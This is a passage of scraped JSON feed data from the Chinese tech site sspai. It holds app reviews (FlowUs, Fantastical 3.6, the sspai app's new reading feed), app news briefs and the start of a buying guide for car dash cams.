src=\"https://cdn.sspai.com/editor/u_/c8523odb34taavnbbs70.png\"></figure><p>与常规 To-Do 应用类似，Combapu 的每项家务项目都可自由设定循环周期，甚至你可以为更换客厅窗帘这种家务设定每年循环的周期事件。比较有趣的是，在新建家务项目时，应用里提供了一个「Level of frustration」选项，你可以根据你对该家务项目的喜好程度，选择「这是生活中最糟糕的家务」或者「没有人知道我有多喜欢这项家务」等等 5 个级别，有点黑色幽默的意味了。</p>\n<p>不仅是将家务进行分类梳理，为了不会让你手忙脚乱，Combapu 还提供了时间线视图。应用会根据家务的不同完成时间、不同循环周期计算出下次执行时间，你可以查看一定时间范围内需要进行的家务，有时间的话，提前擦一下桌子、吸一下地面，随手完成一些轻量家务也能节省不少时间呢。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c8523olb34taavnbbs7g.png\"></figure><p>现在，你可以在 <a href=\"https://play.google.com/store/apps/details?id=com.appentwicklungseevetal.combapu\" target=\"_blank\">Google Play </a>免费下载 Combapu，高级版售价 5.49 美元，可解锁房间、家务限制并获得数据统计功能。</p>\n<span class=\"ss-application\" app-id=\"16342\"> </span><h3><strong>FlowUs：国产 Notion 是否也好用？</strong></h3>\n<ul>\n<li>平台：iOS / Android / Web</li>\n<li>关键词：文档、协作</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@化学心情下2\" user-id=\"bs2od75b34tch2730oa0\" href=\"https://sspai.com/u/liuxiaofengone\">@化学心情下2</a>：相比传统的笔记类服务，Notion 的出现可能会让你惊讶于原来笔记可以像搭建积木那样变成各种形式的工具组合——待办事项、个人主页、读书笔记甚至智能表单。不过苦于 Notion 至今并没有推出中文版，在国内使用也不免会有些许不方便，好在我可以使用这款国内「平替」——FlowUs。</p>\n<p>注册 FlowUs 进入空间之后会默认进入到 FlowUs 的欢迎页面， 默认情况下你的个人空间会设立多个功能页面，比如简单笔记、读书笔记、代办事项、文件管理、习惯养成以及个人主页，其实也不难看出 FlowUs 针对国人使用上更强调开箱即用，也就是无需自己构建页面模块，大部分功能可以直接使用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c8523otb34ta9bscqrfg.png\"></figure><p>当然如果你想要创建一个新的功能页面也并不复杂，相反由于母语优势，FlowUs 提供了更本地化的功能搭建方法——首先是模板中心就提供了相当多的功能区域，其实涵盖了生活和工作中需要的功能，而如果你不甚满意也可以直接通过空白文档中开始从头搭建。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c8523p5b34ta98875sig.png\"></figure><p>空白模板更像是一个基础的文档编辑器，通过输入 <code>/</code> 可以调用不同的功能块，比如针对简单的文档编辑，你可以使用 <code>/</code> + <code>html 语法</code> 来构建不用的段落样式，也可以直接使用 Markdown 语法直接进行编辑。而对于交互性表格以及第三方功能嵌入，FlowUs 反而更接地气一些，比如说你如果是产品经理，可以直接嵌入你在墨刀中制作的原型，甚至可以插入其他平台上制作的流程图或者是视频链接，尤其是在制作 BRD 、PRD 或者 MRD 文档时，这种交互式的文档可以有机地把线上各个平台的制作有机地整合在一起。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c8523p5b34taatkrlq30.png\"></figure><p>而这种灵活性也使得 FlowUs 可以实现诸多效率工具的功能，比如待办事项，以往我们都需要通过第三方工具来实现，而整合到 FlowUs 则可以将其和文档工具整合在一起，减少了跨工具使用带来的交互关联等难题。FlowUs 也提供了诸如文件夹网盘、经过原生开发的移动客户端等差异化之处。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c8523pdb34ta98875sj0.png\"></figure><p>至于团队协作等功能这里就不单独赘述了，总之作为一款国产 Notion 平替，FlowUs 依旧有着不小的发展空间，但对于主要使用 Notion 基础功能的用户而言，FlowUs 当前的功能也已经绰绰有余，并且更适用于国内的使用场景。</p>\n<p>你可以在 <a href=\"https://flowus.cn/product\" target=\"_blank\">这里</a> 注册 和使用 FlowUs。</p>\n<span class=\"ss-application\" app-id=\"16341\"> </span><h2>值得关注的 App 更新</h2>\n<p>除了「新鲜」App，App Store 中的许多老面孔也在不断迭代、更新，增加更多有趣和实用的功能。少数派希望帮你筛选 App Store 中值得关注的 App 动态，让你快速了解 App 和开发者们的最新动态。</p>\n<h3>少数派：「派读」模块上线，为你提供更多定制内容</h3>\n<ul>\n<li>平台：iOS / iPadOS</li>\n<li>关键词：少数派、阅读</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Vanilla\" user-id=\"bs2ov5lb34tch278f9ag\" href=\"https://sspai.com/u/whoops\">@Vanilla</a>：很多热爱少数派或者喜欢在少数派上「摸鱼」的读者都反馈说文章不够读，一方面是因为编辑们的精力有限，每天从众多文章中挑选出合适的 3-5 篇并发布到首页，中间需要经历联系作者、反复改稿、排版配图、拟写推广标题等步骤，另一方面是因为 Matrix 社区展示的文章是由社区运营人员每天手动精选，数量也是有限的，这样一来读者们每天在少数派看到的新文章基本上不会超过 10 篇。在这次更新中，少数派 App 推出了一个全新的「派读」模块，算法会根据兴趣、关注的账号、文章互动情况等，为每一个读者量身打造一套信息流。</p>\n<p>打开少数派 App 后，有两种方式可以进入「派读」模块——点击首页左上角的少数派 LOGO 或者在屏幕左侧向右滑动。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c8523plb34ta9bscqrg0.jpeg\"></figure><p>第一次使用派读前，我需要先选择感兴趣的领域和值得关注的少数派（账号），然后应用会通过这些信息生成一套我专属的内容空间。在这个空间里，包含了我关注的兴趣领域或者关注的账号发布的文章。在使用之前，我会担心这样的信息流设计会像今日头条等 App 一样无止尽地刷新出新的内容，所幸的是在「派读」中每天最多只会推荐 10 来篇文章，大大减轻了我的信息焦虑症。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c8523ptb34taatkrlq3g.jpeg\"></figure><p>在信息流的顶部，可以看到我关注的账号最近有没有更新。点击「全部」按钮即可进入「关注人最近更新」的空间，在这里可以看到我关注的账号在近期更新的文章。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c8523q5b34ta98875sjg.jpeg\"></figure><p>在「派读」模块中，还加入了一个「我的收藏」功能，在这里可以看到我在少数派全站上添加为收藏的所有文章，还可以根据普通文章、会员文章、付费栏目进行筛选。在「派读」模块中的文章，都可以通过左滑将它快速添加到收藏夹中。而在收藏夹中，也可以通过左滑将文章快速地取消收藏。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c8523qdb34taavnbbs80.jpeg\"></figure><p>除了文章，「派读」模块还会推荐一些和我关注领域相关的活动，比如说「一派」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c8523qtb34taatkrlq40.jpeg\"></figure><p>这次「派读」模块的更新，可以说打破了 Matrix 社区的壁垒，用一种非常巧妙的方式实现了丰富的内容和克制的展示之间的平衡。</p>\n<p>你可以在 <a href=\"https://sspai.com/page/client\" target=\"_blank\">这里</a> 下载少数派 App，Android 版本会在之后更新「派读功能」，敬请期待。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/71409\" target=\"_blank\">少数派 App 大更新，我们为你准备了一份专属内容拼盘：派读</a></p>\n<span class=\"ss-application\" app-id=\"16013\"> </span><h3>Fantastical 更新：会议日程功能更加完善</h3>\n<ul>\n<li>平台：iOS / iPadOS / macOS</li>\n<li>关键词：日历、日程</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@黎明前线Alan\" user-id=\"bs2pdmtb34tcs0po3gag\" href=\"https://sspai.com/u/safari_cheung\">@黎明前线Alan</a>：Fantastical 是 Apple 生态中一直颇受好评，同时也是最老牌的第三方日历 App 之一，上周发布了 3.6 版本更新，对现有功能进行了更深度整合的同时也有新功能加入。</p>\n<p>首先是新增的 Openings 功能：不同的人参加多人会议等活动时往往需要根据自己的日程来安排，这个过程中经常会产生很多不必要的沟通成本。而 Opening 功能就是将你在 Fantastical 当前日程的计划表以一个简略的方式直接分享给别人的工具：你当前已经被占用的时间以及空闲时间都会呈现在日程表上，对方可以选择你当前仍然空闲的时间提出会议申请。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c8523r5b34ta9bscqrgg.png\"></figure><p>对方通过链接提出申请之后，你就能在 Fantastical 中收到相关的活动创建通知，对方也会直接收到这一活动的日程提醒，这些都可以通过 Fantastical 自动完成，大大降低了人工沟通以及操作成本。</p>\n<p>在这一功能中，收件人一方只能通过分享链接看到你当前日历的空闲时间，并选择一个合适的时间段申请；日程中已有相关的事件数据都是保密信息，收件人无法看到具体事项。在降低沟通成本的同时也保护了隐私。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c8523rlb34ta98875sk0.png\"></figure><p>之前 Fantastical 3 中就已经加入的、可以给被邀请者发送多个时间段供其选择的 Proposals 功能，在 3.6 版本更新中加入了新的应用内置 UI 界面。其他收到会议邀请的 Fantastical 用户可以在这里看到其他参会者的日程寻找并留下评论。组织者在更新 3.6 版本之后也可以直接在应用内确认最终日期以及回复评论。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c8523rtb34ta9bscqrh0.png\"></figure><p>不过就更新内容上来讲，Fantastical 3.6 中关于 Proposals 功能的改进只有与其他已经更新 Fantastial 3.6 的用户沟通时才能正常使用了。如果收件人并非 Fantastical 用户，就只能查看当前计划事件的时间段以及回复。</p>\n<p>最后 3.6 版本更新还在视图选项中加入了季度视图（Quarter View）功能，即只展示接下来三个月内的日程动态，在月度与年度日程中间的一个尺度上展示未来三个月的近况。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c8523s5b34taavnbbs8g.png\"></figure><p>Fantastical 3 采取的是基础功能免费 / 高级功能订阅的付费模式。Fantastical Premium 高级版提供两星期的免费试用期，如果你之前已经免费试用过，在 3.6 版本更新之后你仍然可以重新获得两周的试用权。Fantastical Premium 价格为 4.99 美元 / 月或者 39.99 美元 / 年。</p>\n<p>你可以在 App Store 下载到 <a href=\"https://apps.apple.com/cn/app/fantastical-2-for-iphone-calendar/id718043190\" target=\"_blank\">iOS / iPadOS</a> 版及 <a href=\"https://apps.apple.com/cn/app/fantastical-calendar-tasks/id975937182?mt=12\" target=\"_blank\">macOS</a> 版 Fantastical。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/58643\" target=\"_blank\">iOS/macOS 上最老牌的日历 App 之一，Fantastical 更新 3.0</a></p>\n<span class=\"ss-application\" app-id=\"3537\"> </span><h2>App 速报</h2>\n<ul>\n<li>继此前 <a href=\"https://sspai.com/post/62547\" target=\"_blank\">调整收费计划</a> 之后，Setapp 在近期再次作出 <a href=\"https://support.setapp.com/hc/en-us/articles/360007109260\" target=\"_blank\">调整</a>。</li>\n<li>Ulysses（<a href=\"https://apps.apple.com/cn/app/ulysses-writing-app/id1225571038\" target=\"_blank\">iOS</a>）：更新至 v25，编辑器现在支持从设备上安装的第三方字体应用中选择字体，重新设计了写作目标功能的视觉效果；共享扩展采用了新的外观设计，使用外接键盘时可以使用快捷键 <code>⌘+</code>、<code>⌘-</code> 和 <code>⌘0</code> 来更改编辑器的文字大小。</li>\n<li>Tweetbot（<a href=\"https://apps.apple.com/us/app/tweetbot-6-for-twitter/id1527500834\" target=\"_blank\">iOS</a>）：更新至 v7.0，统计视图功能正式回归，此外还带来了 hej 和 bumblebee 两个全新的主题。</li>\n<li>Vivaldi（<a href=\"https://vivaldi.com/zh-hans/download/\" target=\"_blank\">Windows | macOS</a>）：推出 v5.1，带来新的标签页管理方式——水平滚动选项卡，起始页中新增了一个快速设置面板，同时新增了阅读列表用来保存之后要读的页面。</li>\n</ul>\n<p>&gt; 全新派读功能现已上线，快下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派客户端 </a>体验吧！</p>\n<p>&gt; 年度回顾、好物推荐…… 更多精彩尽在 <a href=\"http://sspai.com/page/2021\" target=\"_blank\">少数派 2021 年度盘点</a> 🎉</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/71434"},{"title":"少数派 App 大更新，我们为你准备了一份专属内容拼盘：派读","date":"2022-02-14 08:00:00","description":"\n<p>在少数派的 <a href=\"https://sspai.com/post/56548\">Web 3.0</a> 和 <a href=\"https://sspai.com/page/client\">客户端 2.0</a> 中，我们为大家带来了「关注」时间流，通过关注感兴趣的作者和读者，你可以更快获取他们在少数派上的最新动态，比如 TA 发布的文章和评论、喜欢的文章、专栏更新等等，希望能够以此帮你找到更多想读的内容、收获更多有价值的讨论与思考。</p>\n<p>不过，除了少数派首页每日推荐的精彩内容，少数派 Matrix 社区每天也会增加不少值得一读的文章，它们与首页文章一样，横跨不同领域、涉及各种类型。如果仅靠关注不同的「人」，许多有价值的内容都可能会被你错过。</p>\n<p>因此，我们率先在少数派的 iOS / iPadOS 客户端中推出了「派读」功能。在这里，我们将根据你感兴趣的领域、关注的用户和文章互动情况，准备一份专属于你的内容拼盘。</p>\n<h2>派读：探索少数派的新维度</h2>\n<p>不同于桌面平台，移动设备的使用场景更为碎片化甚至是随机化，与其以「人」为中心，我们更喜欢你在移动平台上与内容的交互能以「文章」为中心，因此我们用「派读」替换掉了原有的「关注」时间流，希望通过用户关系链以及你关注的话题 / 标签，提供足够数量但又不会过分干扰的内容，解决你的探索需求。</p>\n<p>在最新版的少数派客户端中，前往首页向右滑动，即可进入「派读」界面。初次进入「派读」，你需要选择至少 4 个感兴趣的领域、10 位值得关注的创作者，我们会根据你的选择，将最适合你的内容推送给你。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/13/73d9734575d7075d1f0bb4e2a01746d0.png\"></figure><p>为了保证内容质量，「派读」中的文章除了来自你的关注，还有许多少数派编辑部精心挑选与整理出来的内容。如果你在读完少数派首页和 Matrix 社区中的文章之后感到意犹未尽，那就来「派读」看看吧。为了不给你增加过多负担，「派读」的推荐数量将会保持克制，不会成为你的另一个无穷无尽的时间流。当然，你也可以在「派读」界面下方找到往期推荐的入口，不错过每一期精彩文章。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/13/9b454651a3725abbeab332ea46413629.png\"></figure><p>我们也用「派读」代替了客户端中原有的「关注」时间流，在「派读」界面的最上方，你可以看到关注的创作者中哪些人有新的动态，点击即可查看他们发布 / 点赞的文章、参与的讨论等等。如果你关注的话题在少数派上有新的「一派」讨论活动，也会呈现在这里，期待你的每一次发言。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/13/6d7f178c45f4063ce5c9d5babb12aa6f.png\"></figure><p>我们还将收藏功能放进了「派读」，你收藏的首页文章、会员内容、付费栏目，都可以在这里找到。在 iPad 上，你还可以利用大屏优势，更好地阅读「派读」。可以说，「派读」就是你探索少数派的一个全新的维度。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/14/29bc52b653961521c7d66f7bcb35335a.jpeg\"></figure><p>除了向读者输送内容，「派读」也是为创作者准备的一盏聚光灯，希望能够帮助他们和他们创作的好内容，被更多人看到，引发更多有价值的思考与交流。目前来看，「派读」也在这一方面取得了一点小成绩，我们很高兴地看到，不少创作者在这项功能推出之后，收获了数百甚至数千名的关注者，而且这一数字还在不断增加。</p>\n<p>目前，「派读」这项功能还处在非常早期的阶段，我们稍后还将带来更多可以关注的话题领域，并为 Android 客户端也加上这项功能。如果你有任何建议或者意见，也欢迎通过客户端内的反馈功能联系我们，我们会根据这些反馈以更快的节奏对「派读」进行调整，期待收到你的来信。</p>\n<h2>近期值得关注的更新</h2>\n<p>除了「派读」功能，少数派客户端近期也有一些值得关注的更新，一起介绍给你。</p>\n<p>首先是稍后读功能。遇到感兴趣的长文，又不能马上读完，除了把它们发送到第三方稍后读工具，你也可以选择将这些文章直接放在少数派里了。在文章页面点击右上角的菜单按钮，选择「稍后读」，你就能在之后通过首页右下方的「收纳盒」按钮，找到这篇文章。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/13/5b7d764e554a9b7b7cccf40a0c9b4c23.png\"></figure><p>付费栏目文章也支持离线阅读了，在付费栏目的目录页面点击「下载」按钮，选择你希望下载到设备中的文章即可。你可以在设置页面选择是否允许通过蜂窝网络下载文章、以及管理正在下载与已下载的内容。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/13/84ef488ccab2a841748840d3d20cb535.png\"></figure><p>以上就是少数派的全新「派读」功能，以及近期值得关注的更新内容，现在，就请你亲启这段惊喜与发现之旅吧。</p>\n<span class=\"ss-application\" app-id=\"16013\"> </span><p>&gt; 全新「派读」功能现已上线，快下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派客户端 </a>体验吧！</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/71409"},{"title":"不买可以先收藏 10：选对行车记录仪，和路上的「麻烦」坦然交手","date":"2022-02-14 06:35:57","description":"\n<p>来到今年，拥有汽车的家庭已经不再少数，交通也变得越来越拥挤，交通事故发生的概率也自然越来越高。发生「小剐小蹭」以后如果能第一时间确认事故责任当然能避免不少麻烦，所以行车记录仪必定是绝大多数人的必备车品。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c84scmdb34ta9bscqpl0.png\"><figcaption>种类形态各异的行车记录记录仪</figcaption></figure><p>当我们随便在某橙色和某红色软件里搜索「行车记录仪」这样的关键词时，一大片的结果就扑面而来，当仔细查看完各个产品的详细介绍页面，最后很多时候也就只能记得各式各样花里胡哨的营销术语，「怎么选」这个问题依旧没办法解决。</p>\n<p>所以，这期的「不买可以先收藏」我将着重于「如何挑选行车记录仪」，希望大家在未来可以挑选到适合自己的行车记录仪。</p>\n<h2>行车记录仪的种类</h2>\n<p>挑选行车记录仪的第一步就是要确定你打算买什么种类的行车记录仪，根据「是否携带显示屏」、「是否替换后视镜」以及「安装位置」这三点我们可以把行车记录仪分为以下 4 类：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c84scmtb34taavnbbqdg.jpeg\"></figure><ul>\n<li>隐藏式</li>\n<li>迷你便携式</li>\n<li>后视镜式</li>\n<li>车机式</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/14/article/d66a480a29282aa1266d7e5cc48652e7\"><figcaption>图片来自互联网</figcaption></figure><p>隐藏式一般是指体积小巧的行车记录仪，得益于小巧的体积所以安装步骤比较简单、隐蔽性也好，安装时通常需要替换后视镜底座或是使用胶固定。但有得必有失，隐藏式行车记录仪一般不会配备显示屏，所以回看内容时需要使用手机 App 或是取出存储卡进行读取。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c84scndb34ta9bscqplg.png\"><figcaption>图片来自互联网</figcaption></figure><p>迷你便携式行车记录仪有时也会被卡片机式行车记录仪、或是卡片式行车记录仪，它和隐藏式最大的不同就是配备了一块显示屏，通过这块屏幕可以实时观看画面或是对录像进行回放。当然配备了显示屏体积就自然也就变大了，所以相对而言隐蔽性就自然不如上面的隐藏式了。这种类型的行车记录仪安装步骤也很简单，使用吸盘和固定胶就可以完成安装了。不过既然有了屏幕，有厂商会在上面做一些花里胡哨的功能，但我们这里暂不展开。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c84scnlb34taatkrlo90.png\"><figcaption>图片来自互联网</figcaption></figure><p>后视镜式行车记录仪会配备一个比迷你便携式行车记录仪更大的屏幕，而且通常需要绑在原有后视镜上或是对原有后视镜进行替换，安装过程相对上面两种会麻烦一点。但这种后视镜式行车记录仪不仅可以带来行车记录仪的功能，还可以实现更大的后视镜范围甚至是更好的后视镜抗反光体验；有利当然也有弊，这种设计的行车记录仪在使用屏幕的时候就没办法正常使用后视镜。此外，还有一些后视镜式行车记录仪内置了 Android 系统，玩法更多的同时价格自然也更贵。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c84scntb34ta98875r30.png\"><figcaption>图片来自互联网</figcaption></figure><p>最后，车机式行车记录仪是比较小众的一类行车记录仪。这种类型的行车记录仪一般都需要替换整个汽车的原有的中控，改动非常大，供电相对更加方便，也没有走线烦恼，而且车机的使用体验也能有一个巨大的飞跃。不过成本和风险都很高，所以此类产品不在本文的讨论范围中；此外，由于汽车种类繁多，选用这类车机的用户之前一定要有充足的调研，避免踩坑。</p>\n<p>总之，你可以根据自己的实际情况选购合适类型的行车记录仪，没有一切完美的行车记录仪，多少需要有一点取舍。</p>\n<h2>行车记录仪的功能</h2>\n<h3>记录行车信息</h3>\n<p>接下来就到了行车记录仪最重要的功能部分了，对于行车记录仪而言它最重要的功能就是需要记录行车信息了，记录行车信息从重要到次重要依次包含如下三点：</p>\n<ul>\n<li>清不清晰</li>\n<li>广不广角</li>\n<li>丢不丢帧</li>\n</ul>\n<h4>清晰度</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c84sco5b34taatkrlo9g.png\"><figcaption>镜头模会很大程度影响画面，</figcaption></figure><p>清晰度首先依赖于镜头，但很多时候我们没到手之前很难了解到镜头的具体情况，所以我们这时只能通过买家点评中的返图进行判断。但一般而言只要不是太廉价的行车记录仪，镜头不至于特别差。</p>\n<p>清晰度又分为三个情况：光照充足的白天清晰度、光照不足（甚至几乎没有的）夜间清晰度、高对比度下（进出山洞时）的清晰度，分别也就对应了分辨率、光圈和传感器以及软件算法三种不同的需求。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/14/8347e3d52bc6d15bda6262adb0421828.png\"><figcaption>白天清晰度主要受到分辨率影响</figcaption></figure><p>在白天，分辨率越高清晰度自然也就越好，除了常见的 1080P 现在厂商普遍还会宣传 2K、3K 甚至是 4K 的分辨率，但分辨率高了录制的帧率一定会下降，而行车记录又是高速影像，低帧率更容易引起果冻效应，导致图像模糊、不全等问题。所以清晰度一定不是越高越好，甚至高分辨率可能还会影响其他改善画质功能的使用，根据下面其他作者的实际分享来看 1080P 今天已经够用了，在改善画质功能不缺失以及预算允许的情况下选择更好的画质也完全可以。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/14/8f4e1cc50e78526b487f7c13f49a5fa1.png\"><figcaption>低照度下，光圈和传感器主要承担画质的作用</figcaption></figure><p>在晚上，低环境亮度的情况下，比较考验的就是摄像头的光圈和传感器的大小了，一般商家会以 <code>F/数字</code> 或是 <code>ƒ/数字</code> 标注，<code>数字</code> 越小光圈越大，进光亮也就越大，在低亮度下也就拍得更清楚。不过这只是理论上，实际还会和下面提到的软件算法密切相关。一般而言 <code>ƒ/2</code> 的夜间成像效果已经很不错了 <code>ƒ/1.8</code> 则会更好。传感器和光圈一样也是越大越好，越大的传感器意味着传感器也能捕获更多的光，一般标注为 <code>1/数字</code>，因此在相同像素下它的数字应该是越小越好。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c84scp5b34ta9bscqpm0.png\"><figcaption>软件算法问题导致的「圣光」</figcaption></figure><p>软件算法也非常影响画面画质，优秀的软件算法很大概率上会弥补硬件上的一些短板，但和镜头一样没到手之前你也不会知道具体算法如何，这里同样只能依赖于商品详情和商品点评。一般而言在商品的详情页有类似「减少噪点」、「夜间抑制高光」、「智能 HDR」等关键词意味着他们至少有在算法上下过功夫，至于真的用起来怎么样还是要看商品点评下的返图。</p>\n<h4>广角</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/14/d68f16a1ba66a0db37ec1f2e42a8fcf6.png\"><figcaption>行车记录仪 140° 所拍摄的到的画面</figcaption></figure><p>行车记录仪镜头的角度越大，也就意味着可以记录到的影像也就越多，正常驾驶过程中行车记录仪至少需要覆盖 3 条车道，根据后文其他作者的回报的数据来看行车记录仪在 120° 的广角刚好可以覆盖 3 条车道，相对更宽一点的 140° 则可以覆盖 4 个多一点的范围，至于 170° 双向 6 车道能看的清清楚楚。不过，广角的角度越大，越靠近边缘的形变也自然越严重，相对而言有效画面面积也会相应得减少，所以广角角度也自然需要有所取舍。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c84scptb34ta9bscqpn0.png\"></figure><p>行车记录仪 170° 所拍摄的到的画面</p>\n<h4>帧率</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c84scqdb34ta9bscqpng.png\"><figcaption>高速运动的扇叶（左）使用卷帘快门因果冻效应呈现右侧图片的效果，图片来自互联网</figcaption></figure><p>由于汽车是高速运动的物体，所以行车记录从某种意义上来说是高速影像。由于绝大多数的 CMOS 都采用的是卷帘快门，这种快门在每次曝光的时候都需要逐行扫描进行曝光，因此当扫描速度不够时，也就帧率较低时非常容易发生果冻效应。行车记录中果冻效应一般会让画面出现类似倾斜、摇摆不定或是部分曝光等情况，进一步影响到画面中关键信息。</p>\n<p>因此，行车记录仪具备较高的帧率也显得非常重要，从我个人情况来看，行车记录仪最好能选择 30FPS 以及以上的帧率，60FPS 最好。而不少产品中还会宣传更高的帧率，一般我们这时候还需要留意达到这样的帧率会有什么限制，会不会影响到其他的重要功能。</p>\n<p>此外，行车记录仪工作的温度和存储卡等外部因素也会影响帧率。中国的夏季温度普遍较高，加上阳光直射和黑色外壳吸热的特点，非常考验行车记录仪的稳定性，稳定较差的行车记录仪会因为温度过高的关系，导致跳帧甚至是死机。而存储卡也是很多人选购行车记录仪时经常会忽略的一点，劣质的存储卡也是写入时录像容易丢帧的罪魁祸首，不过这里就先不展开如何挑选存储卡了，可以在购买时询问客服。</p>\n<h3>取出录像</h3>\n<p>除了录制，取出录像其实也是行车记录仪的重要功能，取出录像的难易程度也会影响实际出「事」以后的处理速度。一般而言，行车记录仪有如下的取出的方式：直接从 SD 卡中取出、通过接线取出、通过无线取出，三种方法也各有优劣势。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c84scqlb34taavnbbqe0.png\"></figure><p>总的来说 SD 卡方法需要另一个设备支持读取 SD 卡，否则根本谈不上取出，如果不凑巧的话想取出录像的就非常难。但这也是最通用的办法，而且真的读取成功以后视频回放也很方便。</p>\n<p>外接线缆曾经也是一个很流行的方法，和取出 SD 卡一样通用、回放视频也很容易。不过问题在于接口的普及速度、用户会不会以及有线需要坐在驾驶舱里才能导出这三点问题上。</p>\n<p>通过无线取出的方法通常需要搭配厂家自己的 App，优势当然是软硬件结合，导出也没有任何门槛。但有些行车记录仪导出速度慢时一方面，另外一方面就是经常被人吐槽的 App 非常难用了，比如 App 操作卡顿、满屏幕的广告、做社交广场什么的就不说了，有些甚至烂到急用时根本连不上的情况。所以大家挑选完行车记录仪以后，最好还要看看对应的 App 有没有什么坑要踩，提前做一下心理准备。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c84scqtb34ta98875r40.jpeg\"><figcaption>钛马星 App</figcaption></figure><h3>附加功能</h3>\n<p>附加功能在我看来就是行车记录仪那些可以「锦上添花」的功能，也是商家喜欢多多宣传的方向，但切记不要为了这些功能而忽视了上面介绍的主要功能。这部分包括了：语音控制、导航、听音乐、停车监控、ADAS、H.265 等等和行车记录没有直接相关的功能。</p>\n<h4>停车监控</h4>\n<p>停车监控就是指在汽车关闭引擎以后能够继续录制画面，避免停车以后被别人撞了以后连人都找不到。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c84scr5b34ta9bscqpo0.png\"></figure><p>停车监控这个功能现在的行车记录仪基本上都有，不过能不能用得上就要看车了。如果你直接从车辆的雨刷或是驾驶舱的保险盒进行取电，那么这个功能基本是完全没有问题了，唯一要担心的就是这个功能会不会耗空电瓶，不过理论上现在大部分的行车记录仪在正确使用的降压线以后还是能通过电池回报的电压正确关闭这个功能的。</p>\n<p>而有些车只能通过点烟器取电的话，这个功能就要看停车以后点烟器能不能继续工作了，如果可以的话可能依然需要注意电瓶的亏电问题，而且点烟器不像上面提到的取电方法一样行车记录仪能了解到电瓶的电压，所以长期停车且使用这个功能非常有可能导致汽车无法启动。如果不能通过点烟器取电那这个功能也相当于无法使用，停车以后的意外情况也就意味着不能正常记录了。</p>\n<p>这个功能在当下也有了不小了升级，一方面是提供了缩时的功能，可以快进不必要的画面，节省空间和观看时的精力；另一方面则是还给夜间停车监控增加了多帧合成的功能，让夜间暗处的影像变得更加清楚。但这两个功能不排除因为算法的问题没有宣传的那么好的可能，所以还是需要从点评中进行分析。</p>\n<h4>语音控制</h4>\n<p>首先，行车记录仪记录事故是依靠加速度传感器和陀螺仪判断是否发生事故，从而自动保存（甚至是锁定）事故前后的录像。所以，从我的角度来看用语音控制行车记录仪记录交通「风险」的次数很低，但可能是有一定的实用性。</p>\n<p>但如果要用语音控制去控制更复杂的功能，人工智障的气息一定会扑面而来，识别错误率一定不低；另外就是社交尴尬的 <a href=\"https://sspai.com/post/47485\" 